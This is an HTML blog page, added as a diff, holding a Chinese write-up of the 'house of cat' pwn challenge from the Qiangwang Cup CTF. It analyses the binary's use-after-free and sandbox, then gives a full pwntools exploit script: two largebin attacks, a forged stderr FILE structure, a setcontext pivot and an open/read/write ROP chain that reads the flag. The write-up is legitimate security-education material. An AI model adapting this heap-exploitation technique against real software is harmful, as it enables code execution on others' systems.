@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <script>
+    (function () {
+      try {
+        var t = localStorage.getItem('theme');
+        if (t === 'light' || t === 'dark') {
+          document.documentElement.setAttribute('data-theme', t);
+        }
+      } catch (e) {}
+    })();
+  </script>
+  <title>
+    
+    house of cat 强网杯复现 丨
+    
+
+    K&#39;s Map | DeePunk&#39;s Blog
+  </title>
+
+  
+  <link rel="shortcut icon" href="/icon.svg">
+  
+
+  <!-- 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Serif:ital,wght@0,400;0,600;0,700;1,400;1,600&family=Noto+Serif+SC:wght@400;600;700&display=swap" rel="stylesheet">
+
+  
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+  <script defer src="/js/highlight.min.js"></script>
+  <script defer src="/js/image-zoom.js"></script>
+  <script defer src="/js/toc.js"></script>
+  
+
+  
+<link rel="stylesheet" href="/css/root.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/post.css">
+
+<meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="K's Map | DeePunk's Blog" type="application/atom+xml">
+</head>
+
+  <body>
+    <header class="header">
+  <section class="header-container">
+    <a class="logo" href="/">K&#39;s Map | DeePunk&#39;s Blog</a>
+    <ul class="nav">
+      
+      <li><a href="/about">about</a></li>
+      
+    </ul>
+  </section>
+</header>
+      
+            <main class="main">
+              <article class="post">
+  
+  <div class="post-title">house of cat 强网杯复现</div>
+  <div class="post-meta">
+    <div class="date">2023 七月 27日</div>
+    <div class="tags">
+      
+      <a class="tag-item" href="/tags/pwn" style="color: #d1d5da;">pwn</a>
+      
+      <a class="tag-item" href="/tags/wp" style="color: #d1d5da;">wp</a>
+      
+      <a class="tag-item" href="/tags/iofile" style="color: #d1d5da;">iofile</a>
+      
+    </div>
+  </div>
+  
+
+  <main class="post-content"><blockquote>
+<p>最后一天的题，水水</p>
+</blockquote>
+<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="格式检查"><a href="#格式检查" class="headerlink" title="格式检查"></a>格式检查</h3><pre><code class="highlight shell">LOGIN | r00t QWBQWXFadmin
+CAT | r00t QWBQWXF$\xff</code></pre>
+
+<h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>index在0到15间</p>
+<p>0x418&lt;&#x3D; size &lt;&#x3D;0x46f</p>
+<p>使用calloc</p>
+<h4 id="delet"><a href="#delet" class="headerlink" title="delet"></a>delet</h4><p>UAF</p>
+<h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p>write 0x30</p>
+<h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p>限制2次</p>
+<p>每次只能修改<strong>0x30</strong></p>
+<h2 id="攻击流程分析"><a href="#攻击流程分析" class="headerlink" title="攻击流程分析"></a>攻击流程分析</h2><p>由于不存在对exit的调用，且在main函数中无限循环，故无法进行FSOP</p>
+<p>可以采用house of kiwi的触发IO思路，利用<code>__malloc_assert</code>调用<code>fflush(stderr)</code>或者<code>__fxprintf</code></p>
+<p>所以需要攻击位于stderr上的指针，恰好本题该地址可写，这里使用一次largebin attack</p>
+<p>另外，要触发<code>__malloc_assert</code>，需要修改topchunk的size</p>
+<p>本题由于edit有长度限制，不方便使用之前构造堆重叠的方式，所以这里可以用第二次largebin attack攻击size</p>
+<p>恰好共有两次edit机会，刚好用完e</p>
+<p>另外，攻击top size时要注意，在将第二个chunk加入largebin时，不能改变top chunk的位置。也就是说，不能通过分配一个更大chunk的方式来得到第二个largechunk</p>
+<p>这是因为对largebin进行unlink的操作在从topchunk分配chunk之前，此时修改过的size会被新的size覆盖掉。</p>
+<p>所以这一步入largebin的操作，可以通过分配更小的chunk获得</p>
+<p><img src="/../img/house-of-cat.assets/image-20230726120735530.png" alt="image-20230726120735530"></p>
+<p>开了沙箱，禁用了execve，并检查read的fd是否为0</p>
+<p>故只能打orw, 并且在open前需要先close(0)</p>
+<h2 id="堆风水"><a href="#堆风水" class="headerlink" title="堆风水"></a>堆风水</h2><p>需要达到的效果是：两次largebin attack，分别使stderr指向可控内容的堆块、修改topchunk</p>
+<p>看似比较简单，但需注意edit只能修改0x30，且只有两次机会</p>
+<p>所以对伪造结构体内容的写入需要在add操作进行，入largebin之后对前6个地址会有覆盖，实测下来对IO利用没有影响</p>
+<h2 id="IO利用流程分析"><a href="#IO利用流程分析" class="headerlink" title="IO利用流程分析"></a>IO利用流程分析</h2><p>_wide_data&#x3D;fake_io_addr+0x30</p>
+<p>1.将[rdi+0xa0]<code>_wide_data</code>处的内容赋值给rax，为了避免与下面的rax混淆，称之为<strong>rax1</strong>。<br>2.将新赋值的[rax1+0x20]<code>_IO_backup_base</code>处的内容赋值给rdx。<br>3.将[rax1+0xe0]</p>
+<p>处的内容赋值给rax，称之为<strong>rax2</strong>。<br>4.call调用[rax2+0x18]处的内容。</p>
+<pre><code class="highlight c">_wide_data-&gt;_IO_read_ptr ！=_wide_data-&gt;_IO_read_end
+_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base
+#如果_wide_data=fake_io_addr+<span class="number">0x30</span>，其实也就是fp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base
+fp-&gt;_lock是一个可写地址（堆地址、libc中的可写地址</code></pre>
+
+<pre><code class="highlight python"><span class="comment">#!/usr/bin/env python2</span>
+<span class="comment"># -*- coding: utf-8 -*-</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span>*
+
+context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])
+<span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):
+	cmd += <span class="string">&quot;b main\n&quot;</span>
+	gdb.attach(p, cmd)
+	pause()
+
+host = <span class="string">&quot;&quot;</span>
+port = <span class="number">0</span>
+p = process(<span class="string">&quot;./pwn&quot;</span>)
+<span class="comment">#p = remote(host, port)</span>
+libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)
+
+login = <span class="string">&quot;LOGIN | r00t QWB QWXFadmin&quot;</span>
+cat = <span class="string">&quot;CAT | r00t QWB QWXF$\xff&quot;</span>
+
+<span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):
+	p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)
+	p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;1&quot;</span>)
+	p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())
+	p.sendlineafter(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(size).encode())
+	p.sendafter(<span class="string">&quot;content:\n&quot;</span>,content)
+<span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):
+	p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)
+	p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;2&quot;</span>)
+	p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())
+<span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):
+	p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)
+	p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;3&quot;</span>)
+	p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())
+<span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):
+	p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)
+	p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;4&quot;</span>)
+	p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())
+	p.sendafter(<span class="string">&quot;content:\n&quot;</span>,content)
+
+p.send(login)
+add(<span class="number">0</span>, <span class="number">0x420</span>, cyclic(<span class="number">0x420</span>))<span class="comment">#largechunk 0</span>
+add(<span class="number">1</span>, <span class="number">0x440</span>, cyclic(<span class="number">0x440</span>))
+delete(<span class="number">0</span>)
+add(<span class="number">2</span>, <span class="number">0x450</span>, cyclic(<span class="number">0x450</span>))
+show(<span class="number">0</span>)<span class="comment">#leak largechunk</span>
+
+libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x21a0d0</span>
+stderr_addr = libc_base + <span class="number">0x21a860</span>
+setcontext61 = libc_base + <span class="number">0x53a6d</span>
+p.recvuntil(<span class="string">&quot;\x7f\x00\x00&quot;</span>)
+heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x290</span>
+log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))
+log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))
+log.success(<span class="string">&quot;stderr_addr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))
+
+ret = <span class="number">0x0000000000029cd6</span>+libc_base
+pop_rdi = <span class="number">0x000000000002a3e5</span>+libc_base
+pop_rsi = <span class="number">0x000000000002be51</span>+libc_base
+pop_rax = <span class="number">0x0000000000045eb0</span> + libc_base
+syscall = <span class="number">0x0000000000091396</span> + libc_base
+
+<span class="comment"># debug()</span>
+<span class="comment">#fake stderr----------------------------------------</span>
+fake_stderr = heap_base + <span class="number">0xf70</span>
+fake_rdx = fake_stderr + <span class="number">0x10</span> + <span class="number">0x200</span>
+fake_stack = fake_stderr + <span class="number">0x10</span> + <span class="number">0x320</span>
+io = p64(<span class="number">0</span>)*<span class="number">6</span>
+io += p64(<span class="number">1</span>) + p64(<span class="number">2</span>)<span class="comment">#rcx!=0</span>
+io += p64(fake_rdx)<span class="comment">#backup_base rdx</span>
+io += p64(setcontext61)
+io = io.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)
+io += p64(libc_base+<span class="number">0x21ba60</span>)<span class="comment">#lock</span>
+io = io.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)
+io += p64(fake_stderr+<span class="number">0x30</span>)<span class="comment">#wide_data rax1</span>
+io = io.ljust(<span class="number">0xb0</span>, <span class="string">&#x27;\x00&#x27;</span>)
+io += p64(<span class="number">1</span>)<span class="comment">#mode</span>
+io = io.ljust(<span class="number">0xc8</span>, <span class="string">&#x27;\x00&#x27;</span>)
+io += p64(libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]+<span class="number">0x10</span>)
+io += p64(<span class="number">0</span>)*<span class="number">6</span>
+io += p64(fake_stderr+<span class="number">0x40</span>)
+io = io.ljust(<span class="number">0x200</span>, <span class="string">&#x27;\x00&#x27;</span>)
+<span class="comment">#fake rdx:</span>
+payload = <span class="string">&quot;./flag\x00\x00&quot;</span>
+payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)
+payload += p64(<span class="number">0</span>)<span class="comment">#rdi-&gt;0</span>
+payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span>
+payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)
+payload += p64(<span class="number">0x100</span>)<span class="comment">#rdx-&gt;0</span>
+payload = payload.ljust(<span class="number">0xa0</span>)
+payload += p64(fake_stack)<span class="comment">#rsp-&gt;chunk 1</span>
+payload += p64(ret)<span class="comment">#rcx-&gt;ret</span>
+io += payload
+io = io.ljust(<span class="number">0x320</span>,<span class="string">&quot;\x00&quot;</span>)
+<span class="comment">#fake_stack:</span>
+payload = p64(libc_base+libc.sym[<span class="string">&#x27;close&#x27;</span>])
+payload += p64(ret)
+payload += p64(pop_rdi)
+payload += p64(fake_rdx)
+payload += p64(pop_rax)
+payload += p64(<span class="number">2</span>)
+payload += p64(syscall)<span class="comment">#open</span>
+payload += p64(pop_rax)
+payload += p64(<span class="number">0</span>)
+payload += p64(pop_rdi)
+payload += p64(<span class="number">0</span>)
+payload += p64(pop_rsi)
+payload += p64(heap_base + <span class="number">0x100</span>)
+payload += p64(syscall)<span class="comment">#read</span>
+payload += p64(pop_rax)
+payload += p64(<span class="number">1</span>)
+payload += p64(pop_rdi)
+payload += p64(<span class="number">1</span>)
+payload += p64(pop_rsi)
+payload += p64(heap_base + <span class="number">0x100</span>)
+payload += p64(syscall)<span class="comment">#write</span>
+io+=payload
+
+io = io.ljust(<span class="number">0x430</span>,<span class="string">&#x27;\x00&#x27;</span>)
+
+<span class="comment">#----------------------------------------------</span>
+
+add(<span class="number">4</span>,<span class="number">0x440</span>,io)<span class="comment"># largebin 0 </span>
+add(<span class="number">5</span>,<span class="number">0x440</span>,cyclic(<span class="number">0x440</span>))
+add(<span class="number">6</span>,<span class="number">0x430</span>,cyclic(<span class="number">0x430</span>))<span class="comment">#largebin 1</span>
+<span class="comment"># add(7,0x440,cyclic(0x440))</span>
+<span class="comment"># add(8,0x420,cyclic(0x420))</span>
+delete(<span class="number">4</span>)
+add(<span class="number">9</span>,<span class="number">0x460</span>,cyclic(<span class="number">0x440</span>))
+delete(<span class="number">6</span>)
+<span class="comment">#largebin attack</span>
+payload = p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0xf90</span>) + p64(stderr_addr-<span class="number">0x20</span>) + p64(<span class="number">0</span>)*<span class="number">2</span>
+edit(<span class="number">4</span>, payload)
+add(<span class="number">10</span>,<span class="number">0x460</span>,cyclic(<span class="number">0x460</span>))
+
+add(<span class="number">11</span>, <span class="number">0x430</span>, cyclic(<span class="number">0x430</span>))<span class="comment">#calloc chunk6</span>
+
+<span class="comment">#largebin attack 2</span>
+
+delete(<span class="number">11</span>)<span class="comment">#largebin 1 0x430</span>
+<span class="comment">#delete(8)</span>
+payload = p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0xf90</span>) + p64(heap_base+<span class="number">0x2538</span>-<span class="number">5</span>-<span class="number">0x20</span>) + p64(<span class="number">0</span>)*<span class="number">2</span>
+edit(<span class="number">4</span>, payload)
+add(<span class="number">15</span>,<span class="number">0x41f</span>,cyclic(<span class="number">0x41f</span>))
+
+
+<span class="comment"># debug()</span>
+add(<span class="number">7</span>, <span class="number">0x460</span>,cyclic(<span class="number">0x460</span>))<span class="comment">#trigger malloc assert</span>
+
+p.interactive()</code></pre>
+
+</main>
+
+  
+</article>
+            </main>
+            
+              <footer class="footer">
+  
+  <span>Copyright © 2021 DeePunk</span>
+  
+</footer>
+
+<button id="theme-toggle" type="button" aria-label="切换主题">☾</button>
+                
+<script src="/js/theme.js"></script>
+
+  </body>
+
+</html>
